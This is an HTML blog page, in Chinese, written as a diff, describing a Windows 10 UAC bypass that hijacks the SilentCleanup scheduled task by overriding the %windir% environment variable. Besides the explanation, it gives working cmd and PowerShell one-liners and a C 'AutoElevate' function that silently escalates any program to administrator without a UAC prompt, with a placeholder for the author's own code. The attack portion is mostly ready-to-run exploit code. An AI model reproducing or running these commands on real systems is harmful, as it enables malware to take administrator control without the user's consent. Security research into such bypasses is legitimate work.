@@ -1,0 +1,461 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+  dir="ltr"
+>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>windows 10下利用schtasks绕过uac - huolong blog</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="0x00 前言
+最近在刷知乎的时候发现了一种早就被揭露但目前为止还未被修复的uac bypass手段，个人觉得其中的思路很有参考意义，故记录下来学习一下。
+0x01 原理
+这种uac bypass的原理是寻找权限控制不严格的程序进行劫持，以达到绕过uac使用管理员权限的shell。
+0x02 利用方法
+计划任务中的silentcleanup的关键信息如下：
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;
+&lt;Task xmlns=&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;SecurityDescriptor&gt;D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)&lt;/SecurityDescriptor&gt;
+    &lt;Source&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;/Source&gt;
+    &lt;Author&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;/Author&gt;
+    &lt;Description&gt;$(@%systemroot%\system32\cleanmgr.exe,-1301)&lt;/Description&gt;
+    &lt;URI&gt;Microsoft\Windows\DiskCleanup\SilentCleanup&lt;/URI&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&#34;Authenticated Users&#34;&gt;
+      &lt;GroupId&gt;S-1-5-32-545&lt;/GroupId&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Settings&gt;
+    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
+    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
+    &lt;ExecutionTimeLimit&gt;PT15M&lt;/ExecutionTimeLimit&gt;
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
+    &lt;RunOnlyIfIdle&gt;true&lt;/RunOnlyIfIdle&gt;
+    &lt;IdleSettings&gt;
+      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+      &lt;RestartOnIdle&gt;true&lt;/RestartOnIdle&gt;
+    &lt;/IdleSettings&gt;
+    &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;
+    &lt;MaintenanceSettings&gt;
+      &lt;Period&gt;P1D&lt;/Period&gt;
+      &lt;Deadline&gt;P1M&lt;/Deadline&gt;
+    &lt;/MaintenanceSettings&gt;
+  &lt;/Settings&gt;
+  &lt;Triggers /&gt;
+  &lt;Actions Context=&#34;Authenticated Users&#34;&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;%windir%\system32\cleanmgr.exe&lt;/Command&gt;
+      &lt;Arguments&gt;/autoclean /d %systemdrive%&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;
+可以看到Authenticated Users表示普通用户权限即可启动而RunLevel为Highest表示以高权限启动。这就使得劫持该程序可以运行拥有管理员权限的shell进行操作。
+打开SilentCleanup这一文件查看其中代码，可知它其实是运行了%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive% 这一命令。我们只要将%windir%的环境变量进行修改即可实现对该程序的劫持。
+比如说：将%windir%设置为C:\hack并在C:\hack\system32下将payload.exe保存为cleanmgr.exe那么在启动计划任务SilentCleanup时，就会以高权限运行代码.
+0x03 具体代码实现
+分为两种版本吧：
+1.cmd版本" />
+  <meta name="author" content="huolong blog" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="http://localhost:1313/theme.png" />
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  <script
+    defer
+    src="http://localhost:1313/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+  
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css"
+  integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI"
+  crossorigin="anonymous"
+/>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js"
+  integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t"
+  crossorigin="anonymous"
+></script>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js"
+  integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05"
+  crossorigin="anonymous"
+></script>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', () =>
+    renderMathInElement(document.body, {
+      
+      
+      delimiters: [
+        { left: '$$', right: '$$', display: true },
+        { left: '$', right: '$', display: false },
+      ],
+      
+      throwOnError: false,
+    }),
+  );
+</script>
+
+  
+  
+  
+
+  
+  <link
+    rel="icon"
+    href="http://localhost:1313/favicon.ico"
+  />
+  <link
+    rel="apple-touch-icon"
+    href="http://localhost:1313/apple-touch-icon.png"
+  />
+
+  
+  <meta name="generator" content="Hugo 0.136.5">
+
+  
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-[--w] px-8 lg:justify-center">
+  <div class="relative z-50 ltr:mr-auto rtl:ml-auto flex items-center">
+    <a class="-translate-y-[1px] text-2xl font-medium" href="http://localhost:1313/"
+      >huolong blog</a
+    >
+    <div
+      class="btn-dark text-[0] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 ltr:-mr-8 rtl:-ml-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-[--w] px-8 pb-16 pt-14 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-14">
+    <h1 class="!my-0 pb-2.5">windows 10下利用schtasks绕过uac</h1>
+
+    
+    <div class="text-xs antialiased opacity-60">
+      
+      <time>Feb 19, 2021</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><h3 id="0x00-前言">0x00 前言</h3>
+<p>最近在刷知乎的时候发现了一种早就被揭露但目前为止还未被修复的uac bypass手段，个人觉得其中的思路很有参考意义，故记录下来学习一下。</p>
+<h3 id="0x01-原理">0x01 原理</h3>
+<p>这种uac bypass的原理是寻找权限控制不严格的程序进行劫持，以达到绕过uac使用管理员权限的shell。</p>
+<h3 id="0x02-利用方法">0x02 利用方法</h3>
+<p>计划任务中的silentcleanup的关键信息如下：</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;
+&lt;Task xmlns=&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;SecurityDescriptor&gt;D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)&lt;/SecurityDescriptor&gt;
+    &lt;Source&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;/Source&gt;
+    &lt;Author&gt;$(@%systemroot%\system32\cleanmgr.exe,-1300)&lt;/Author&gt;
+    &lt;Description&gt;$(@%systemroot%\system32\cleanmgr.exe,-1301)&lt;/Description&gt;
+    &lt;URI&gt;Microsoft\Windows\DiskCleanup\SilentCleanup&lt;/URI&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&#34;Authenticated Users&#34;&gt;
+      &lt;GroupId&gt;S-1-5-32-545&lt;/GroupId&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Settings&gt;
+    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
+    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
+    &lt;ExecutionTimeLimit&gt;PT15M&lt;/ExecutionTimeLimit&gt;
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
+    &lt;RunOnlyIfIdle&gt;true&lt;/RunOnlyIfIdle&gt;
+    &lt;IdleSettings&gt;
+      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+      &lt;RestartOnIdle&gt;true&lt;/RestartOnIdle&gt;
+    &lt;/IdleSettings&gt;
+    &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;
+    &lt;MaintenanceSettings&gt;
+      &lt;Period&gt;P1D&lt;/Period&gt;
+      &lt;Deadline&gt;P1M&lt;/Deadline&gt;
+    &lt;/MaintenanceSettings&gt;
+  &lt;/Settings&gt;
+  &lt;Triggers /&gt;
+  &lt;Actions Context=&#34;Authenticated Users&#34;&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;%windir%\system32\cleanmgr.exe&lt;/Command&gt;
+      &lt;Arguments&gt;/autoclean /d %systemdrive%&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;
+</code></pre><p>可以看到Authenticated Users表示普通用户权限即可启动而RunLevel为Highest表示以高权限启动。这就使得劫持该程序可以运行拥有管理员权限的shell进行操作。
+打开SilentCleanup这一文件查看其中代码，可知它其实是运行了%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive% 这一命令。我们只要将%windir%的环境变量进行修改即可实现对该程序的劫持。
+比如说：将%windir%设置为C:\hack并在C:\hack\system32下将payload.exe保存为cleanmgr.exe那么在启动计划任务SilentCleanup时，就会以高权限运行代码.</p>
+<h3 id="0x03-具体代码实现">0x03 具体代码实现</h3>
+<p>分为两种版本吧：
+1.cmd版本</p>
+<pre tabindex="0"><code>reg add hkcu\Environment /v windir /d &#34;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &#34; &amp;&amp; schtasks /Run /TN Microsoft\Windows\DiskCleanup\SilentCleanup /I
+</code></pre><p>2.powershell版本</p>
+<pre tabindex="0"><code>reg add hkcu\Environment /v windir /d &#34;powershell -noexit reg delete hkcu\Environment /v windir /f ; # &#34; ; schtasks /Run /TN Microsoft\Windows\DiskCleanup\SilentCleanup /I
+</code></pre><h3 id="0x04-后续利用技巧">0X04 后续利用技巧</h3>
+<p>我写了一个AutoElevate的函数,可以使我们自己写的代码默认运行在高权限下而不弹出uac(并未关闭uac)</p>
+<pre tabindex="0"><code>#include&lt;stdio.h&gt;
+#include&lt;Windows.h&gt;
+BOOL AutoElevate(char ** argv)
+{
+	char elevateCommand[260] = &#34;add hkcu\\Environment /f /v windir /d \&#34;&#34;;
+	DWORD dwRetLen = 0;
+	HANDLE TokenHandle = 0;
+	TOKEN_ELEVATION IsAdmin;
+	HANDLE CurProcHandle = GetCurrentProcess();
+	lstrcat(elevateCommand, argv[0]);
+	lstrcat(elevateCommand, &#34; \&#34;&#34;);
+	OpenProcessToken(CurProcHandle, TOKEN_ALL_ACCESS, &amp;TokenHandle);
+	GetTokenInformation(TokenHandle, TokenElevation, &amp;IsAdmin, sizeof(TOKEN_ELEVATION), &amp;dwRetLen);
+	if (IsAdmin.TokenIsElevated == 1)
+	{
+		ShellExecute(NULL, NULL, &#34;reg.exe&#34;, &#34;delete hkcu\\Environment /v windir /f&#34;, NULL, SW_HIDE);
+		return TRUE;
+	}
+	else
+	{
+		ShellExecute(NULL, NULL, &#34;reg.exe&#34;, elevateCommand, NULL, SW_HIDE);
+		ShellExecute(NULL, NULL, &#34;schtasks.exe&#34;, &#34;/Run /TN Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I&#34;, NULL, SW_HIDE);
+		return FALSE;
+	}
+}
+int main(int argc, char* argv[], char* envp[])
+{
+	if (AutoElevate(argv))
+	{
+		system(&#34;cmd&#34;);
+		//fill with your own code
+	}
+	else printf(&#34;error!&#34;);
+	return 0;
+}
+</code></pre><p>运行结果是启动了管理员权限的cmd.我觉得不满意的地方是如果以非管理员权限打开程序时它会闪一个黑框框(即很快地运行又退出了),这对于强迫症来说是不可接受的,以后有时间再看看怎么改进吧.</p>
+<h3 id="总结">总结</h3>
+<p>微软并未把uac当作安全的边界,这使得这个bug都过了一年多了还没修,当然这种bug或许造成的危害也不够大,并未引起人家重视,但是把这玩意当做漏洞利用链的一环还是可以的,多一个还未维修的漏洞,多一个思路.</p>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav
+    class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg !leading-[1.2] *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"
+  >
+    
+    <a class="ltr:pr-3 rtl:pl-3" href="http://localhost:1313/posts/windows%E6%9C%BA%E5%88%B6/windows%E4%B8%8B%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA/"
+      ><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Windows进程创建过程</span></a
+    >
+    
+    
+    <a class="ltr:ml-auto rtl:mr-auto justify-end pl-3" href="http://localhost:1313/posts/windows%E6%9C%BA%E5%88%B6/windows%E5%AF%B9unicode%E7%9A%84%E6%94%AF%E6%8C%81/"
+      ><span>Windows编程中的Unicode问题</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="mx-auto flex h-[4.5rem] max-w-[--w] items-center px-8 text-xs uppercase tracking-wider opacity-60"
+>
+  <div class="mr-auto">
+  
+    &copy; 2024
+    <a class="link" href="http://localhost:1313/">huolong blog</a>
+  
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >powered by hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >hugo-paper</a
+  >
+</footer>
+
+  </body>
+</html>
